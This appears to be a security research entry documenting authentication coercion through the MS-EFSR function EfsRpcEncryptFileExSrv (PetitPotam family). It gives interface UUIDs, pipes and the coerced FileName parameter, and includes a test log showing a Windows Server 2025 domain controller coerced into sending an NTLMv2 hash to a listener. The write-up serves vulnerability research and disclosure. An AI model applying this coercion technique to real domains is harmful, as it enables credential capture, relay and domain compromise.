# MS-EFSR - Remote call to EfsRpcEncryptFileExSrv (opnum 21)

## Summary

+ **Protocol**: [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-9c61-4d5f-8da8-07d5170a1a34)

+ **Interface UUIDs**: `df1941c5-fe89-4e79-bf10-463657acf44d` v1.0 (the only one exposed on Windows Server 2022 23H2+/2025) and the classic `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0 (older builds).

+ **SMB Named pipes**: `\PIPE\efsrpc` / `\PIPE\lsarpc` (df1941c5); `\PIPE\lsarpc` / `\PIPE\netlogon` / `\PIPE\samr` / `\PIPE\lsass` (c681d488).

+ **Function name**: [`EfsRpcEncryptFileExSrv`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/9dc47d6a-cd5e-4a3e-9a2e-1d4bb0f9b3d7)

+ **Function operation number**: `21`

+ **Authenticated**: Yes — **any authenticated user** (EFSRPC authorization model); no administrative privilege required.

## Description

`EfsRpcEncryptFileExSrv` requests server-side encryption of the file named by `FileName`. The EFS
server opens the file to encrypt it, so a UNC `FileName` makes the server (running as the machine
account) authenticate outbound to the listener — an authentication coercion. This is an additional
member of the EFSRPC (PetitPotam) family and, like the rest of it, is callable by any authenticated
domain user.

```cpp
long EfsRpcEncryptFileExSrv(
   [in] handle_t binding_h,
   [in, string] wchar_t* FileName,
   [in, string, unique] wchar_t* ProtectorDescriptor,
   [in] unsigned long Flags
 );
```

+ **Coerced parameter**: `FileName` (`\\<listener>\share\file.txt`).
+ **ProtectorDescriptor**: `NULL`. **Flags**: `0`.
+ `binding_h` is the implicit RPC binding handle (not marshalled).

## Testing status — CONFIRMED (authenticated user)

**Confirmed coercion on Windows Server 2025** (domain controller), 2026-09-14, via
[`poc/python/coerce_poc.py`](./poc/python/coerce_poc.py):

```
bind df1941c5-fe89-4e79-bf10-463657acf44d v1.0 over \PIPE\efsrpc (NTLM + PKT_PRIVACY)
EfsRpcEncryptFileExSrv(FileName="\\<listener>\share\file.txt", ProtectorDescriptor=NULL, Flags=0)
  -> ERROR_BAD_NETPATH (0x35) — the normal result of a successful coercion
  -> listener: TMP-W-2025-DC1$ authenticated (NTLMv2 captured)
```

Notes established during testing:

- On Windows Server 2022 23H2+/2025 only the **`df1941c5`** interface is exposed; binding the classic
  `c681d488` interface is rejected (`provider_rejection`). The PoC tries `df1941c5` (over `\efsrpc`
  then `\lsarpc`) first and falls back to `c681d488` for older targets.
- EFSRPC requires **RPC packet privacy** on every method since [MSFT-CVE-2021-43893]; the PoC sets
  NTLM + `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`.
- **Not reachable unauthenticated**: a null session can open `\lsarpc` and bind EFSR, but the call
  returns `rpc_s_access_denied` (and `\efsrpc` refuses the null session at pipe open) — the classic
  unauthenticated PetitPotam path is closed by [MSFT-CVE-2021-43893] on this build.

## References

+ [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-9c61-4d5f-8da8-07d5170a1a34

+ EFSR interface UUID changes on recent Windows: `../efsrpc-interface-uuid-changes.md`
